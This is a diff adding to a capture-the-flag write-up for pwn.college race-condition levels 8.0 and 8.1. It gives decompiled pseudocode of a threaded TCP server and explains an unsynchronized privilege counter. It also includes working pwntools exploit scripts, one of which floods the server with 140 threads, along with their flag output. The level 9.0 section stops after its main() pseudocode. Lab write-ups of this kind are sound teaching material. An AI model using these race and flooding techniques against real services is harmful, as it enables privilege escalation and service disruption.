@@ -2704,3 +2704,569 @@ Logging out due to timeout.
 Logging out due to timeout.
 pwn.college{MkRZF-oW341A1-jwOETkEKxPY9_.0FNxQDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## level8.0
+
+> Exploit a race condition in a multi-threaded network service to affect program behavior.
+
+```text
+hacker@race-conditions~level8-0:~$ /challenge/babyrace_level8.0
+###
+### Welcome to /challenge/babyrace_level8.0!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited parallel connections.
+```
+
+Unlike the previous challenges, this binary acts as a TCP server. Each incoming connection is handled in a separate thread, and all threads share the same global state.
+
+### Source code analysis
+
+The server accepts connections and creates a new thread for each client:
+
+```c title="/challenge/babyrace_level8.0 :: main() :: Pseudocode" showLineNumbers
+while ( 1 )
+{
+    v6 = accept(fd, 0LL, 0LL);
+
+    arg = malloc(0x18uLL);
+    *(_DWORD *)arg = v6;
+    *((_DWORD *)arg + 1) = argc;
+    *((_QWORD *)arg + 1) = argv;
+    *((_QWORD *)arg + 2) = envp;
+
+    pthread_create(&newthread, 0LL, run_thread, arg);
+}
+```
+
+Each thread initializes its own socket streams and then enters the challenge logic:
+
+```c title="/challenge/babyrace_level8.0 :: run_thread() :: Pseudocode" showLineNumbers
+__int64 __fastcall run_thread(int *a1)
+{
+    __writefsqword(0xFFFFFFF0, (unsigned __int64)fdopen(*a1, "r"));
+    __writefsqword(0xFFFFFFF8, (unsigned __int64)fdopen(*a1, "w"));
+
+    setvbuf((FILE *)__readfsqword(0xFFFFFFF0), 0LL, 2, 0LL);
+    setvbuf((FILE *)__readfsqword(0xFFFFFFF8), 0LL, 2, 0LL);
+
+    return challenge(
+        (unsigned int)a1[1],
+        *((_QWORD *)a1 + 1),
+        *((_QWORD *)a1 + 2)
+    );
+}
+```
+
+The actual vulnerability is inside `challenge()`:
+
+```c title="/challenge/babyrace_level8.0 :: challenge() :: Pseudocode" showLineNumbers
+while ( 1 )
+{
+    fprintf(..., "Privilege level: %d\n", privilege_level);
+
+    fscanf(..., "%127s", s1);
+
+    if (!strcmp(s1, "login"))
+    {
+        puts("Privilege level set to 1.");
+        puts("Paused (press enter to continue)");
+        fscanf(..., "%7s", &pause_buffer);
+
+        privilege_level = 1;
+    }
+    else if (!strcmp(s1, "logout"))
+    {
+        if ( privilege_level )
+        {
+            puts("Dropping one privilege level.");
+            puts("Paused (press enter to continue)");
+            fscanf(..., "%7s", &pause_buffer);
+
+            --privilege_level;
+        }
+    }
+    else if (!strcmp(s1, "win_authed"))
+    {
+        if (!privilege_level)
+            puts("You are not logged in!");
+        else if (privilege_level == 1)
+            puts("Your privilege level is too low!");
+        else
+            win();
+    }
+}
+```
+
+### Race Condition
+
+The challenge uses a global `privilege_level` shared between all client threads.
+
+Under normal execution the only reachable values are:
+
+```text
+0 = logged out
+1 = logged in
+```
+
+The `win_authed` function only calls `win()` when the privilege level is neither `0` nor `1`:
+
+```c
+if (!privilege_level)
+    puts("You are not logged in!");
+else if (privilege_level == 1)
+    puts("Your privilege level is too low!");
+else
+    win();
+```
+
+The vulnerability is in `logout()`:
+
+```c
+if ( privilege_level )
+{
+    fscanf(...);   // pause
+    --privilege_level;
+}
+```
+
+The check and decrement are separated by a blocking read. Since multiple client threads share the same global variable, two threads can both observe:
+
+```text
+privilege_level == 1
+```
+
+before either thread performs the decrement.
+
+Timeline:
+
+```text
+Initial state:
+    privilege_level = 1
+
+Thread A:
+    if (privilege_level)   -> true
+    pause
+
+Thread B:
+    if (privilege_level)   -> true
+    pause
+
+Release A:
+    --privilege_level
+    1 -> 0
+
+Release B:
+    --privilege_level
+    0 -> -1
+```
+
+Final result:
+
+```text
+privilege_level = -1
+```
+
+When `win_authed` executes:
+
+```c
+if (!privilege_level)      // false
+if (privilege_level == 1)  // false
+else
+    win();                 // reached
+```
+
+The race allows us to reach the otherwise impossible state `privilege_level == -1`, triggering `win()`.
+
+### Exploit
+
+The attack uses three simultaneous client connections:
+
+1. Connection A logs in and sets `privilege_level = 1`.
+2. Connection B enters `logout()` and pauses before decrementing.
+3. Connection C enters `logout()` and pauses before decrementing.
+4. Both logout threads are released simultaneously.
+5. The shared privilege level becomes `-1`.
+6. Connection A invokes `win_authed`.
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+HOST = "localhost"
+PORT = 1337
+
+# Connection A: login
+a = remote(HOST, PORT)
+
+a.recvuntil(b"quit):")
+a.sendline(b"login")
+
+a.recvuntil(b"continue)")
+a.sendline(b"x")
+
+# Connection B: logout
+b = remote(HOST, PORT)
+
+b.recvuntil(b"quit):")
+b.sendline(b"logout")
+
+b.recvuntil(b"continue)")
+
+# Connection C: logout
+c = remote(HOST, PORT)
+
+c.recvuntil(b"quit):")
+c.sendline(b"logout")
+
+c.recvuntil(b"continue)")
+
+# Release both logout threads
+b.sendline(b"x")
+c.sendline(b"x")
+
+# Trigger win
+a.recvuntil(b"quit):")
+a.sendline(b"win_authed")
+
+print(a.recvall(timeout=2).decode())
+```
+
+```
+hacker@race-conditions~level8-0:~$ /challenge/babyrace_level8.0
+```
+
+```
+hacker@race-conditions~level8-0:~$ python ~/script.py
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[+] Receiving all data: Done (155B)
+[*] Closed connection to 127.0.0.1 port 1337
+ 
+You win! Here is your flag:
+pwn.college{8TBhM99j9jxFIFk0U4WKI2jGsRG.0VNxQDL4ITM0EzW}
+
+
+Privilege level: -1
+[*] Function (login/logout/win_authed/quit): 
+
+[*] Closed connection to 127.0.0.1 port 1337
+[*] Closed connection to 127.0.0.1 port 1337
+```
+
+&nbsp;
+
+## level8.1
+
+> Exploit a race condition in a multi-threaded network service with a much tighter timing window.
+
+```text
+hacker@race-conditions~level8-1:~$ /challenge/babyrace_level8.1
+###
+### Welcome to /challenge/babyrace_level8.1!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited parallel connections.
+```
+
+This challenge is almost identical to [level8.0](#level80), but the pause inside the `logout()` function has been removed. Instead of manually synchronizing two threads, we must now win a much tighter race using a large number of concurrent client connections.
+
+### Source code analysis
+
+As in level8.0, the server creates a new thread for every incoming TCP connection:
+
+```c title="/challenge/babyrace_level8.1 :: main() :: Pseudocode" showLineNumbers
+while ( 1 )
+{
+    v6 = accept(fd, 0LL, 0LL);
+
+    arg = malloc(0x18uLL);
+    *(_DWORD *)arg = v6;
+    *((_DWORD *)arg + 1) = argc;
+    *((_QWORD *)arg + 1) = argv;
+    *((_QWORD *)arg + 2) = envp;
+
+    pthread_create(&newthread, 0LL, run_thread, arg);
+}
+```
+
+Each client thread executes `challenge()`:
+
+```c title="/challenge/babyrace_level8.1 :: challenge() :: Pseudocode" showLineNumbers
+while ( 1 )
+{
+    fprintf(..., "Privilege level: %d\n", privilege_level);
+
+    fscanf(..., "%127s", s1);
+
+    if (!strcmp(s1, "login"))
+    {
+        privilege_level = 1;
+    }
+    else if (!strcmp(s1, "logout"))
+    {
+        if ( privilege_level )
+        {
+            --privilege_level;
+        }
+    }
+    else if (!strcmp(s1, "win_authed"))
+    {
+        if ( privilege_level )
+        {
+            if ( privilege_level == 1 )
+                puts("Your privilege level is too low!");
+            else
+                win();
+        }
+        else
+        {
+            puts("You are not logged in!");
+        }
+    }
+}
+```
+
+The goal is still to reach:
+
+```c
+if ( privilege_level )
+{
+    if ( privilege_level == 1 )
+        puts("Your privilege level is too low!");
+    else
+        win();
+}
+```
+
+Any privilege level other than `0` or `1` reaches `win()`.
+
+### Race Condition
+
+The global variable `privilege_level` is shared across all client threads.
+
+In level8.0 the race window was intentionally enlarged:
+
+```c
+if ( privilege_level )
+{
+    pause();
+    --privilege_level;
+}
+```
+
+allowing two logout threads to be synchronized manually.
+
+In level8.1 the pause has been removed:
+
+```c
+if ( privilege_level )
+{
+    --privilege_level;
+}
+```
+
+However, the decrement is still not protected by any mutex or synchronization primitive. Multiple threads can simultaneously read and modify the same global variable.
+
+By continuously issuing large numbers of concurrent `login`, `logout`, and `win_authed` requests, multiple logout threads eventually race with one another and drive the privilege level below zero:
+
+```text
+privilege_level = 1
+privilege_level = 0
+privilege_level = -1
+privilege_level = -4
+privilege_level = -9
+...
+```
+
+Once the privilege level becomes any value other than `0` or `1`, a concurrent `win_authed` request reaches:
+
+```c
+else
+    win();
+```
+
+and prints the flag.
+
+### Exploit
+
+Instead of carefully synchronizing two connections, we flood the server with concurrent requests:
+
+* Login threads continuously set `privilege_level = 1`.
+* Logout threads continuously decrement the shared value.
+* Win threads continuously attempt `win_authed`.
+
+Eventually a logout race produces a negative privilege level and one of the win threads successfully reaches `win()`.
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+import threading
+import time
+
+HOST = "127.0.0.1"
+PORT = 1337
+
+found = False
+
+def login_worker():
+    while not found:
+        try:
+            r = remote(HOST, PORT, level='error')
+            r.recvuntil(b"quit):")
+            r.sendline(b"login")
+            r.close()
+        except:
+            pass
+
+def logout_worker():
+    while not found:
+        try:
+            r = remote(HOST, PORT, level='error')
+            r.recvuntil(b"quit):")
+            r.sendline(b"logout")
+            r.close()
+        except:
+            pass
+
+def win_worker():
+    global found
+
+    while not found:
+        try:
+            r = remote(HOST, PORT, level='error')
+            r.recvuntil(b"quit):")
+            r.sendline(b"win_authed")
+
+            data = r.recvrepeat(0.2)
+
+            if b"pwn.college{" in data:
+                found = True
+                print(data.decode(errors="replace"))
+                return
+
+            r.close()
+        except:
+            pass
+
+print("[*] Starting race...")
+
+threads = []
+
+for _ in range(20):
+    t = threading.Thread(target=login_worker, daemon=True)
+    t.start()
+    threads.append(t)
+
+for _ in range(100):
+    t = threading.Thread(target=logout_worker, daemon=True)
+    t.start()
+    threads.append(t)
+
+for _ in range(20):
+    t = threading.Thread(target=win_worker, daemon=True)
+    t.start()
+    threads.append(t)
+
+while not found:
+    time.sleep(1)
+```
+
+```
+hacker@race-conditions~level8-1:~$ /challenge/babyrace_level8.1 
+###
+### Welcome to /challenge/babyrace_level8.1!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited parallel connections.
+
+```
+
+```text
+hacker@race-conditions~level8-1:~$ python ~/script.py
+[*] Starting race...
+ 
+You win! Here is your flag:
+pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}
+
+
+Privilege level: -1
+[*] Function (login/logout/win_authed/quit): 
+
+ 
+You win! Here is your flag:
+pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}
+
+
+Privilege level: -9
+[*] Function (login/logout/win_authed/quit): 
+
+ 
+You win! Here is your flag:
+pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}
+
+
+Privilege level: -4
+[*] Function (login/logout/win_authed/quit): 
+
+ 
+You win! Here is your flag:
+pwn.college{85yPKay8UE2W7Y-e-lMPF6M2ShA.0lNxQDL4ITM0EzW}
+
+
+Privilege level: -5
+[*] Function (login/logout/win_authed/quit): 
+```
+
+&nbsp;
+
+## level9.0
+
+```
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int optval; // [rsp+24h] [rbp-3Ch] BYREF
+  int fd; // [rsp+28h] [rbp-38h]
+  int v6; // [rsp+2Ch] [rbp-34h]
+  pthread_t newthread; // [rsp+30h] [rbp-30h] BYREF
+  void *arg; // [rsp+38h] [rbp-28h]
+  struct sockaddr addr; // [rsp+40h] [rbp-20h] BYREF
+  unsigned __int64 v10; // [rsp+58h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts("This challenge is listening for connections on TCP port 1337.\n");
+  puts("The challenge supports unlimited parallel connections.\n");
+  fd = socket(2, 1, 0);
+  optval = 1;
+  setsockopt(fd, 1, 15, &optval, 4u);
+  addr.sa_family = 2;
+  *(_DWORD *)&addr.sa_data[2] = 0;
+  *(_WORD *)addr.sa_data = htons(0x539u);
+  bind(fd, &addr, 0x10u);
+  listen(fd, 1);
+  signal(13, sigpipe_handler);
+  while ( 1 )
+  {
+    v6 = accept(fd, 0LL, 0LL);
+    arg = malloc(0x18uLL);
+    *(_DWORD *)arg = v6;
+    *((_DWORD *)arg + 1) = argc;
+    *((_QWORD *)arg + 1) = argv;
+    *((_QWORD *)arg + 2) = envp;
+    pthread_create(&newthread, 0LL, run_thread, arg);
+  }
+}
+```
